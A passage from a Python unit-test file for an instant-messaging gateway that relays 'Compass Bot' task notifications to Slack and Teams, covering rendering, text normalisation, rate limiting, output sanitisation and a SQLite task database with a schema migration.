        handler = PerTaskExitHandler()
        handler.register("task-1")
        self.assertTrue(handler.acknowledge("task-1"))

    def test_acknowledge_unknown(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        self.assertFalse(handler.acknowledge("nonexistent"))

    def test_wait_with_ack(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-2")
        handler.acknowledge("task-2")
        # Should return True immediately since ACK already set
        self.assertTrue(handler.wait("task-2", timeout=1))

    def test_wait_timeout(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-3")
        # No ACK sent — should timeout
        self.assertFalse(handler.wait("task-3", timeout=0.1))

    def test_wait_cleans_up(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-4")
        handler.acknowledge("task-4")
        handler.wait("task-4", timeout=1)
        # After wait, should be cleaned up
        self.assertFalse(handler.acknowledge("task-4"))

    def test_cleanup(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        handler.register("task-5")
        handler.cleanup("task-5")
        self.assertFalse(handler.acknowledge("task-5"))

    def test_parse_default(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.parse({})
        self.assertEqual(rule["type"], "wait_for_parent_ack")
        self.assertEqual(rule["ack_timeout_seconds"], 300)

    def test_parse_custom(self):
        from common.per_task_exit import PerTaskExitHandler
        metadata = {"exitRule": {"type": "immediate", "ack_timeout_seconds": 60}}
        rule = PerTaskExitHandler.parse(metadata)
        self.assertEqual(rule["type"], "immediate")
        self.assertEqual(rule["ack_timeout_seconds"], 60)

    def test_build(self):
        from common.per_task_exit import PerTaskExitHandler
        rule = PerTaskExitHandler.build("immediate", 120)
        self.assertEqual(rule["type"], "immediate")
        self.assertEqual(rule["ack_timeout_seconds"], 120)

    def test_apply_immediate(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        shutdown_called = []
        handler.apply(
            "task-6",
            {"type": "immediate"},
            shutdown_fn=lambda delay_seconds=2: shutdown_called.append(delay_seconds),
            agent_id="test",
        )
        self.assertEqual(shutdown_called, [2])

    def test_apply_persistent(self):
        from common.per_task_exit import PerTaskExitHandler
        handler = PerTaskExitHandler()
        shutdown_called = []
        handler.apply(
            "task-7",
            {"type": "persistent"},
            shutdown_fn=lambda delay_seconds=2: shutdown_called.append(delay_seconds),
            agent_id="test",
        )
        self.assertEqual(shutdown_called, [])


# ── Notification Handler ──────────────────────────────────────────────────

class TestNotificationHandler(unittest.TestCase):
    """Test _handle_notification dispatches to correct connector."""

    def setUp(self):
        import im_gateway.app as app_mod
        self._app_mod = app_mod

        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        app_mod.db = GatewayDB(db_path=self._tmpfile.name)

        # Set up connector map with a mock connector
        from im_gateway.connectors.slack.connector import SlackConnector
        self._connector = SlackConnector({"SLACK_BOT_TOKEN": "xoxb-test"})
        self._sent_messages = []

        # Monkey-patch send_message to capture calls
        original_send = self._connector.send_message
        def mock_send(target, content):
            self._sent_messages.append({"target": target, "content": content})
            return "ok"
        self._connector.send_message = mock_send

        app_mod._connector_map = {"slack": self._connector}

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def test_notification_input_required(self):
        app = self._app_mod
        # Set up conversation and task mapping
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1", "thread_123")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_INPUT_REQUIRED",
            "statusMessage": "What branch?",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })

        self.assertEqual(len(self._sent_messages), 1)
        msg = self._sent_messages[0]
        self.assertIn("Input Required", json.dumps(msg["content"]))

    def test_notification_completed(self):
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "All done!",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })

        self.assertEqual(len(self._sent_messages), 1)
        self.assertIn("Task Completed", json.dumps(self._sent_messages[0]["content"]))

    def test_notification_failed(self):
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_FAILED",
            "statusMessage": "Build broke",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })

        self.assertEqual(len(self._sent_messages), 1)

    def test_notification_unknown_state_ignored(self):
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_WORKING",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })

        self.assertEqual(len(self._sent_messages), 0)

    def test_notification_missing_task_id(self):
        app = self._app_mod
        app._handle_notification({"state": "TASK_STATE_COMPLETED"})
        self.assertEqual(len(self._sent_messages), 0)

    def test_notification_owner_from_db(self):
        """Task owner is looked up from DB when not in payload."""
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Done",
        })

        self.assertEqual(len(self._sent_messages), 1)

    def test_notification_sanitizes_paths(self):
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Output at /app/artifacts/workspaces/task-1/result.json",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })

        content_json = json.dumps(self._sent_messages[0]["content"])
        self.assertNotIn("/app/artifacts", content_json)


# ── Additional Coverage: Teams render_task_failed ──────────────────────────

class TestTeamsConnectorExtended(unittest.TestCase):
    """Extended coverage for Teams connector rendering."""

    def _make_connector(self):
        from im_gateway.connectors.teams.connector import TeamsConnector
        return TeamsConnector({})

    def test_render_task_failed(self):
        c = self._make_connector()
        card = c.render_task_failed("task-fail-1", "Build failed: exit code 1")
        card_json = json.dumps(card)
        self.assertIn("task-fail-1", card_json)
        self.assertIn("Build failed", card_json)
        self.assertEqual(card["contentType"], "application/vnd.microsoft.card.adaptive")

    def test_render_task_completed_no_links(self):
        c = self._make_connector()
        card = c.render_task_completed("t1", "All done!")
        card_json = json.dumps(card)
        self.assertIn("Task Completed", card_json)
        self.assertIn("All done!", card_json)


# ── Additional Coverage: Slack render_task_failed content ──────────────────

class TestSlackConnectorExtended(unittest.TestCase):
    """Extended coverage for Slack connector rendering."""

    def _make_connector(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        return SlackConnector({"SLACK_BOT_TOKEN": "xoxb-test"})

    def test_render_task_failed_content(self):
        c = self._make_connector()
        result = c.render_task_failed("task-x", "npm run build exited with code 1")
        block_text = json.dumps(result)
        self.assertIn("Task Failed", block_text)
        self.assertIn("task-x", block_text)
        self.assertIn("npm run build", block_text)

    def test_render_task_completed_no_links(self):
        c = self._make_connector()
        result = c.render_task_completed("t1", "All done!", links=None)
        self.assertIn("Task Completed", json.dumps(result))
        self.assertNotIn("<http", json.dumps(result))

    def test_render_task_detail(self):
        c = self._make_connector()
        task = {
            "id": "t-detail",
            "status": {
                "state": "TASK_STATE_WORKING",
                "message": {"parts": [{"text": "Processing step 3..."}]},
            },
        }
        result = c.render_task_detail(task)
        block_text = json.dumps(result)
        self.assertIn("t-detail", block_text)
        self.assertIn("TASK_STATE_WORKING", block_text)
        self.assertIn("Processing step 3", block_text)

    def test_text_normalization_combined(self):
        """Multiple Slack tokens in a single message."""
        from im_gateway.connectors.slack.connector import SlackConnector
        text = "<@U111> check <#C222|dev> and <https://jira.com/PROJ-1|PROJ-1>"
        result = SlackConnector._normalize_text(text)
        self.assertIn("@U111", result)
        self.assertIn("#dev", result)
        self.assertIn("PROJ-1 (https://jira.com/PROJ-1)", result)

    def test_text_normalization_empty(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        self.assertEqual(SlackConnector._normalize_text(""), "")
        self.assertEqual(SlackConnector._normalize_text(None), "")

    def test_truncate_long_text(self):
        from im_gateway.connectors.slack.connector import _truncate
        short = "hello"
        self.assertEqual(_truncate(short, 100), short)
        long_text = "x" * 5000
        result = _truncate(long_text, 3000)
        self.assertLessEqual(len(result), 3100)
        self.assertIn("truncated", result)

    def test_state_emoji_mapping(self):
        from im_gateway.connectors.slack.connector import _state_emoji
        self.assertEqual(_state_emoji("TASK_STATE_COMPLETED"), "\u2705")
        self.assertEqual(_state_emoji("TASK_STATE_FAILED"), "\u274c")
        self.assertEqual(_state_emoji("TASK_STATE_INPUT_REQUIRED"), "\u2753")
        self.assertEqual(_state_emoji("TASK_STATE_WORKING"), "\U0001f504")
        self.assertEqual(_state_emoji("UNKNOWN_STATE"), "\U0001f504")


# ── Additional Coverage: DB cleanup_old_task_mappings ──────────────────────

class TestGatewayDBExtended(unittest.TestCase):
    """Extended DB coverage: cleanup, edge cases."""

    def setUp(self):
        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        self.db = GatewayDB(db_path=self._tmpfile.name)

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def test_cleanup_old_task_mappings(self):
        """Completed tasks older than cutoff are cleaned up."""
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.update_task_state("t1", "TASK_STATE_COMPLETED")
        # Use negative age so cutoff is in the future, guaranteeing deletion
        self.db.cleanup_old_task_mappings(max_age_days=-1)
        tasks = self.db.get_user_tasks("slack", "U1", "T1")
        self.assertEqual(len(tasks), 0)

    def test_cleanup_preserves_active_tasks(self):
        """Active tasks should not be cleaned up even with negative cutoff."""
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        # State is SUBMITTED (active), not completed
        self.db.cleanup_old_task_mappings(max_age_days=-1)
        tasks = self.db.get_user_tasks("slack", "U1", "T1")
        self.assertEqual(len(tasks), 1)

    def test_get_task_owner_nonexistent(self):
        result = self.db.get_task_owner("no-such-task")
        self.assertIsNone(result)

    def test_count_active_excludes_failed(self):
        self.db.add_task_mapping("t1", "slack", "U1", "T1")
        self.db.add_task_mapping("t2", "slack", "U1", "T1")
        self.db.update_task_state("t1", "TASK_STATE_FAILED")
        active = self.db.count_active_tasks("slack", "U1", "T1")
        self.assertEqual(active, 1)

    def test_get_conversation_nonexistent(self):
        result = self.db.get_conversation("slack", "nobody", "nowhere")
        self.assertIsNone(result)


# ── Additional Coverage: Compass Subcommand Routing ────────────────────────

class TestCompassSubcommandRouting(unittest.TestCase):
    """Test /compass <subcommand> normalization in handle_inbound."""

    def setUp(self):
        import im_gateway.app as app_mod
        self._app_mod = app_mod
        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        app_mod.db = GatewayDB(db_path=self._tmpfile.name)

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def _make_msg(self, text="", command="", command_args=""):
        from im_gateway.connectors import NormalizedMessage
        return NormalizedMessage(
            channel="slack", user_id="U1", workspace_id="T1",
            text=text, command=command, command_args=command_args,
            reply_target={"channel": "D1"},
        )

    def _make_connector(self):
        from im_gateway.connectors.slack.connector import SlackConnector
        return SlackConnector({"SLACK_BOT_TOKEN": "xoxb-test"})

    def test_compass_tasks_subcommand(self):
        """'/compass tasks' should be normalized to /tasks."""
        app = self._app_mod
        connector = self._make_connector()
        msg = self._make_msg(text="/compass tasks", command="/compass", command_args="tasks")
        # This will try to call compass_client.list_tasks, so we mock it
        import im_gateway.compass_client as cc
        original = cc.list_tasks
        seen_owner_ids = []

        def _fake_list_tasks(owner_user_id=None):
            seen_owner_ids.append(owner_user_id)
            return []

        cc.list_tasks = _fake_list_tasks
        try:
            result = app.handle_inbound(msg, connector)
            # Should render task list (empty)
            self.assertIn("No running tasks", json.dumps(result))
            self.assertEqual(seen_owner_ids, ["U1"])
        finally:
            cc.list_tasks = original


class TestCompassClient(unittest.TestCase):
    class _FakeResponse:
        def __init__(self, payload):
            self._payload = payload

        def read(self):
            return json.dumps(self._payload).encode("utf-8")

        def __enter__(self):
            return self

        def __exit__(self, exc_type, exc, tb):
            return False

    def test_list_tasks_without_owner_filter(self):
        import im_gateway.compass_client as cc

        seen_urls = []

        def _fake_urlopen(req, timeout=0):
            seen_urls.append(req.full_url)
            return self._FakeResponse({"tasks": []})

        original = cc.urlopen
        cc.urlopen = _fake_urlopen
        try:
            result = cc.list_tasks()
            self.assertEqual(result, [])
            self.assertTrue(seen_urls[0].endswith("/api/tasks"))
        finally:
            cc.urlopen = original

    def test_list_tasks_with_owner_filter(self):
        import im_gateway.compass_client as cc

        seen_urls = []

        def _fake_urlopen(req, timeout=0):
            seen_urls.append(req.full_url)
            return self._FakeResponse({"tasks": []})

        original = cc.urlopen
        cc.urlopen = _fake_urlopen
        try:
            result = cc.list_tasks(owner_user_id="user 1")
            self.assertEqual(result, [])
            self.assertIn("ownerUserId=user+1", seen_urls[0])
        finally:
            cc.urlopen = original


class TestCompassSubcommandRoutingExtended(TestCompassSubcommandRouting):
    def test_compass_task_subcommand(self):
        """'/compass task t1' should be normalized to /task with args 't1'."""
        app = self._app_mod
        connector = self._make_connector()
        msg = self._make_msg(text="/compass task t1", command="/compass", command_args="task t1")
        import im_gateway.compass_client as cc
        original = cc.get_task
        cc.get_task = lambda tid: {"task": {"id": "t1", "status": {"state": "TASK_STATE_WORKING"}}}
        try:
            result = app.handle_inbound(msg, connector)
            self.assertIn("t1", json.dumps(result))
        finally:
            cc.get_task = original

    def test_compass_empty_subcommand_shows_help(self):
        """'/compass' with no subcommand should show help."""
        app = self._app_mod
        connector = self._make_connector()
        msg = self._make_msg(text="/compass", command="/compass", command_args="")
        result = app.handle_inbound(msg, connector)
        self.assertIn("Compass Bot", json.dumps(result))

    def test_compass_resume_subcommand(self):
        """'/compass resume t1 my answer' should be normalized correctly."""
        app = self._app_mod
        connector = self._make_connector()
        msg = self._make_msg(
            text="/compass resume t1 my answer",
            command="/compass",
            command_args="resume t1 my answer",
        )
        import im_gateway.compass_client as cc
        original_get = cc.get_task
        original_resume = cc.resume_task
        cc.get_task = lambda tid: {"task": {"id": "t1", "status": {"state": "TASK_STATE_INPUT_REQUIRED"}}}
        cc.resume_task = lambda tid, msg: {"task": {"id": "t1"}}
        try:
            result = app.handle_inbound(msg, connector)
            self.assertIn("resuming", json.dumps(result).lower())
        finally:
            cc.get_task = original_get
            cc.resume_task = original_resume


# ── Additional Coverage: Rate Limiting ─────────────────────────────────────

class TestRateLimiting(unittest.TestCase):
    """Test rate limiting logic."""

    def test_rate_limit_check(self):
        import im_gateway.app as app_mod
        # Clear any prior state
        app_mod._rate_limits.clear()

        # First few requests should pass
        for i in range(app_mod.RATE_LIMIT_PER_MINUTE):
            self.assertTrue(app_mod._check_rate_limit("slack", "U-rate"))

        # Next request should be blocked
        self.assertFalse(app_mod._check_rate_limit("slack", "U-rate"))

    def test_rate_limit_different_users(self):
        import im_gateway.app as app_mod
        app_mod._rate_limits.clear()

        for i in range(app_mod.RATE_LIMIT_PER_MINUTE):
            app_mod._check_rate_limit("slack", "U-a")

        # Different user should not be affected
        self.assertTrue(app_mod._check_rate_limit("slack", "U-b"))

    def test_rate_limit_different_channels(self):
        import im_gateway.app as app_mod
        app_mod._rate_limits.clear()

        for i in range(app_mod.RATE_LIMIT_PER_MINUTE):
            app_mod._check_rate_limit("slack", "U-c")

        # Same user on different channel should not be affected
        self.assertTrue(app_mod._check_rate_limit("teams", "U-c"))


# ── Additional Coverage: Notification Edge Cases ───────────────────────────

class TestNotificationEdgeCases(unittest.TestCase):
    """Test notification edge cases: invalid conversation, missing connector."""

    def setUp(self):
        import im_gateway.app as app_mod
        self._app_mod = app_mod
        self._tmpfile = tempfile.NamedTemporaryFile(suffix=".db", delete=False)
        self._tmpfile.close()
        from im_gateway.db import GatewayDB
        app_mod.db = GatewayDB(db_path=self._tmpfile.name)

        from im_gateway.connectors.slack.connector import SlackConnector
        self._connector = SlackConnector({"SLACK_BOT_TOKEN": "xoxb-test"})
        self._sent_messages = []

        def mock_send(target, content):
            self._sent_messages.append({"target": target, "content": content})
            return "ok"
        self._connector.send_message = mock_send
        app_mod._connector_map = {"slack": self._connector}

    def tearDown(self):
        os.unlink(self._tmpfile.name)

    def test_notification_no_valid_conversation(self):
        """Notification for user with no valid conversation should be silently skipped."""
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.mark_conversation_invalid("slack", "U1", "T1")
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Done",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })
        self.assertEqual(len(self._sent_messages), 0)

    def test_notification_missing_connector(self):
        """Notification for unknown channel should be silently skipped."""
        app = self._app_mod
        app.db.upsert_conversation("lark", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "lark", "U1", "T1")

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Done",
            "ownerUserId": "U1",
            "sourceChannel": "lark",
            "tenantId": "T1",
        })
        self.assertEqual(len(self._sent_messages), 0)

    def test_notification_unauthorized_marks_invalid(self):
        """Connector returning 'unauthorized' should mark conversation invalid."""
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        # Override send_message to return "unauthorized"
        self._connector.send_message = lambda target, content: "unauthorized"

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Done",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })
        conv = app.db.get_conversation("slack", "U1", "T1")
        self.assertEqual(conv["is_valid"], 0)

    def test_notification_error_increments_failure(self):
        """Connector returning 'error' should increment failure count."""
        app = self._app_mod
        app.db.upsert_conversation("slack", "U1", "T1", {"channel": "D1"})
        app.db.add_task_mapping("t1", "slack", "U1", "T1")

        self._connector.send_message = lambda target, content: "error"

        app._handle_notification({
            "taskId": "t1",
            "state": "TASK_STATE_COMPLETED",
            "summary": "Done",
            "ownerUserId": "U1",
            "sourceChannel": "slack",
            "tenantId": "T1",
        })
        conv = app.db.get_conversation("slack", "U1", "T1")
        self.assertEqual(conv["failures"], 1)
        self.assertEqual(conv["is_valid"], 1)  # not yet invalid at 1 failure


# ── Additional Coverage: Sanitization edge cases ──────────────────────────

class TestSanitizationExtended(unittest.TestCase):
    def test_strip_data_paths(self):
        import im_gateway.app as app_mod
        text = "Stored at /app/data/im-gateway/im-gateway.db"
        result = app_mod._sanitize_summary(text)
        self.assertNotIn("/app/data", result)
        self.assertIn("[data-path]", result)

    def test_strip_multiple_credential_types(self):
        import im_gateway.app as app_mod
        text = "password=abc123 and secret=xyz789"
        result = app_mod._sanitize_summary(text)
        self.assertNotIn("abc123", result)
        self.assertNotIn("xyz789", result)
        self.assertEqual(result.count("[REDACTED]"), 2)

    def test_clean_text_unchanged(self):
        import im_gateway.app as app_mod
        text = "Task completed successfully with PR created"
        result = app_mod._sanitize_summary(text)
        self.assertEqual(result, text)


# ── Slack blocks.py standalone tests ───────────────────────────────────────

class TestSlackBlocks(unittest.TestCase):
    """Test the standalone blocks.py module directly."""

    def test_truncate_short(self):
        from im_gateway.connectors.slack.blocks import truncate
        self.assertEqual(truncate("hello", 100), "hello")

    def test_truncate_long(self):
        from im_gateway.connectors.slack.blocks import truncate
        result = truncate("x" * 5000, 3000)
        self.assertIn("truncated", result)
        self.assertLessEqual(len(result), 3100)

    def test_state_emoji(self):
        from im_gateway.connectors.slack.blocks import state_emoji
        self.assertEqual(state_emoji("TASK_STATE_COMPLETED"), "\u2705")
        self.assertEqual(state_emoji("UNKNOWN"), "\U0001f504")

    def test_task_created(self):
        from im_gateway.connectors.slack.blocks import task_created
        result = task_created("t1", "Build feature X")
        self.assertIn("blocks", result)
        self.assertIn("Task Created", json.dumps(result))
        self.assertIn("t1", json.dumps(result))

    def test_task_list_empty(self):
        from im_gateway.connectors.slack.blocks import task_list
        result = task_list([])
        self.assertIn("No running tasks", json.dumps(result))

    def test_task_list_with_tasks(self):
        from im_gateway.connectors.slack.blocks import task_list
        tasks = [{"id": "t1", "status": {"state": "WORKING"}}]
        result = task_list(tasks)
        self.assertIn("t1", json.dumps(result))

    def test_task_list_max_blocks(self):
        from im_gateway.connectors.slack.blocks import task_list, MAX_BLOCKS
        tasks = [{"id": f"t{i}", "status": {"state": "WORKING"}} for i in range(60)]
        result = task_list(tasks)
        self.assertLessEqual(len(result["blocks"]), MAX_BLOCKS)

    def test_task_detail(self):
        from im_gateway.connectors.slack.blocks import task_detail
        task = {"id": "t1", "status": {"state": "TASK_STATE_WORKING", "message": {"parts": [{"text": "Step 2"}]}}}
        result = task_detail(task)
        self.assertIn("t1", json.dumps(result))
        self.assertIn("Step 2", json.dumps(result))

    def test_input_required(self):
        from im_gateway.connectors.slack.blocks import input_required
        result = input_required("Which priority?", "t1")
        rjson = json.dumps(result)
        self.assertIn("Input Required", rjson)
        self.assertIn("t1", rjson)

    def test_task_completed(self):
        from im_gateway.connectors.slack.blocks import task_completed
        result = task_completed("t1", "Done!", [{"url": "https://pr", "title": "PR"}])
        rjson = json.dumps(result)
        self.assertIn("Task Completed", rjson)
        self.assertIn("https://pr", rjson)

    def test_task_failed(self):
        from im_gateway.connectors.slack.blocks import task_failed
        result = task_failed("t1", "Build error")
        self.assertIn("Task Failed", json.dumps(result))

    def test_help_message(self):
        from im_gateway.connectors.slack.blocks import help_message
        result = help_message()
        self.assertIn("Compass Bot", json.dumps(result))

    def test_error_message(self):
        from im_gateway.connectors.slack.blocks import error_message
        result = error_message("Oops")
        self.assertIn(":warning:", json.dumps(result))


# ── Slack normalizer.py standalone tests ───────────────────────────────────

class TestSlackNormalizer(unittest.TestCase):
    """Test the standalone normalizer.py module directly."""

    def test_mention(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        self.assertEqual(normalize_text("<@U123>"), "@U123")

    def test_channel(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        self.assertEqual(normalize_text("<#C456|general>"), "#general")

    def test_labeled_link(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        result = normalize_text("<https://example.com|Example>")
        self.assertEqual(result, "Example (https://example.com)")

    def test_bare_link(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        self.assertEqual(normalize_text("<https://example.com>"), "https://example.com")

    def test_empty(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        self.assertEqual(normalize_text(""), "")
        self.assertEqual(normalize_text(None), "")

    def test_combined(self):
        from im_gateway.connectors.slack.normalizer import normalize_text
        text = "Hey <@U1> check <#C2|dev> at <https://a.com|link>"
        result = normalize_text(text)
        self.assertIn("@U1", result)
        self.assertIn("#dev", result)
        self.assertIn("link (https://a.com)", result)


# ── Teams cards.py standalone tests ────────────────────────────────────────

class TestTeamsCards(unittest.TestCase):
    """Test the standalone cards.py module directly."""

    def test_card_envelope(self):
        from im_gateway.connectors.teams.cards import card_envelope
        result = card_envelope([{"type": "TextBlock", "text": "Hi"}])
        self.assertEqual(result["contentType"], "application/vnd.microsoft.card.adaptive")
        self.assertEqual(result["content"]["type"], "AdaptiveCard")
        self.assertEqual(len(result["content"]["body"]), 1)

    def test_state_emoji(self):
        from im_gateway.connectors.teams.cards import state_emoji
        self.assertEqual(state_emoji("TASK_STATE_COMPLETED"), "\u2705")
        self.assertEqual(state_emoji("UNKNOWN"), "\U0001f504")

    def test_task_created(self):
        from im_gateway.connectors.teams.cards import task_created
        result = task_created("t1", "Build X")
        self.assertIn("Task Created", json.dumps(result))

    def test_task_list_empty(self):
        from im_gateway.connectors.teams.cards import task_list
        result = task_list([])
        self.assertIn("No running tasks", json.dumps(result))

    def test_task_list_with_tasks(self):
        from im_gateway.connectors.teams.cards import task_list
        tasks = [{"id": "t1", "status": {"state": "WORKING"}}]
        result = task_list(tasks)
        self.assertIn("t1", json.dumps(result))

    def test_task_failed(self):
        from im_gateway.connectors.teams.cards import task_failed
        result = task_failed("t1", "Error occurred")
        rjson = json.dumps(result)
        self.assertIn("Task Failed", rjson)
        self.assertIn("t1", rjson)

    def test_help_message(self):
        from im_gateway.connectors.teams.cards import help_message
        result = help_message()
        self.assertIn("Compass Bot", json.dumps(result))

    def test_error_message(self):
        from im_gateway.connectors.teams.cards import error_message
        result = error_message("Something wrong")
        self.assertIn("Error", json.dumps(result))


# ── Teams normalizer.py standalone tests ───────────────────────────────────

class TestTeamsNormalizer(unittest.TestCase):
    """Test the standalone normalizer.py module directly."""

    def test_plain_text(self):
        from im_gateway.connectors.teams.normalizer import normalize_text
        self.assertEqual(normalize_text("Hello world", "plain"), "Hello world")

    def test_html_strip(self):
        from im_gateway.connectors.teams.normalizer import normalize_text
        self.assertEqual(normalize_text("<p>Hello</p>", "html"), "Hello")

    def test_html_unescape(self):
        from im_gateway.connectors.teams.normalizer import normalize_text
        self.assertEqual(normalize_text("A &amp; B"), "A & B")

    def test_empty(self):
        from im_gateway.connectors.teams.normalizer import normalize_text
        self.assertEqual(normalize_text(""), "")
        self.assertEqual(normalize_text(None), "")


# ── Feature 1: Multi-mode session field in DB ─────────────────────────────

class TestSessionModeField(unittest.TestCase):
    """Test session_mode column in user_task_mapping."""

    def setUp(self):
        self._tmpdir = tempfile.mkdtemp()
        self._db_path = os.path.join(self._tmpdir, "session_mode_test.db")
        from im_gateway.db import GatewayDB
        self.db = GatewayDB(db_path=self._db_path)

    def tearDown(self):
        import shutil
        shutil.rmtree(self._tmpdir, ignore_errors=True)

    def test_default_session_mode_is_personal(self):
        self.db.add_task_mapping("t1", "slack", "U1", "W1", thread_ref="ts1")
        owner = self.db.get_task_owner("t1")
        self.assertIsNotNone(owner)
        # Query full row to check session_mode
        import sqlite3
        conn = sqlite3.connect(self._db_path)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT session_mode FROM user_task_mapping WHERE task_id='t1'").fetchone()
        conn.close()
        self.assertEqual(row["session_mode"], "personal")

    def test_session_mode_shared_session(self):
        self.db.add_task_mapping("t2", "teams", "U2", "W2", session_mode="shared-session")
        import sqlite3
        conn = sqlite3.connect(self._db_path)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT session_mode FROM user_task_mapping WHERE task_id='t2'").fetchone()
        conn.close()
        self.assertEqual(row["session_mode"], "shared-session")

    def test_session_mode_team_scoped(self):
        self.db.add_task_mapping("t3", "slack", "U3", "W3", session_mode="team-scoped")
        import sqlite3
        conn = sqlite3.connect(self._db_path)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT session_mode FROM user_task_mapping WHERE task_id='t3'").fetchone()
        conn.close()
        self.assertEqual(row["session_mode"], "team-scoped")

    def test_invalid_session_mode_falls_back_to_personal(self):
        self.db.add_task_mapping("t4", "slack", "U4", "W4", session_mode="invalid-mode")
        import sqlite3
        conn = sqlite3.connect(self._db_path)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT session_mode FROM user_task_mapping WHERE task_id='t4'").fetchone()
        conn.close()
        self.assertEqual(row["session_mode"], "personal")

    def test_schema_migration_from_v2(self):
        """Simulate a v2 DB and verify migration adds session_mode."""
        import sqlite3
        # Create a v2-style DB without session_mode
        db_path_v2 = os.path.join(self._tmpdir, "v2_test.db")
        conn = sqlite3.connect(db_path_v2)
        conn.execute("""CREATE TABLE IF NOT EXISTS conversations (
            channel TEXT NOT NULL, user_id TEXT NOT NULL, workspace TEXT NOT NULL,
            target TEXT NOT NULL, is_valid INTEGER DEFAULT 1, failures INTEGER DEFAULT 0,
            updated_at TEXT NOT NULL, PRIMARY KEY (channel, user_id, workspace))""")
        conn.execute("""CREATE TABLE IF NOT EXISTS user_task_mapping (
            task_id TEXT NOT NULL PRIMARY KEY, channel TEXT NOT NULL,
            user_id TEXT NOT NULL, workspace TEXT NOT NULL, thread_ref TEXT,
            state TEXT NOT NULL DEFAULT 'SUBMITTED',
            created_at TEXT NOT NULL, updated_at TEXT NOT NULL)""")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_utm_user ON user_task_mapping(channel, user_id, workspace)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_utm_state ON user_task_mapping(state)")
        conn.execute("""CREATE TABLE IF NOT EXISTS activity_dedup (
            activity_id TEXT NOT NULL PRIMARY KEY, processed_at TEXT NOT NULL)""")
        conn.execute("PRAGMA user_version = 2")
        conn.commit()
        conn.close()

        # Now open with GatewayDB which should migrate
        from im_gateway.db import GatewayDB
        db2 = GatewayDB(db_path=db_path_v2)
        db2.add_task_mapping("migrated-t1", "slack", "U1", "W1", session_mode="shared-session")
        conn = sqlite3.connect(db_path_v2)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT session_mode FROM user_task_mapping WHERE task_id='migrated-t1'").fetchone()
        conn.close()
        self.assertEqual(row["session_mode"], "shared-session")


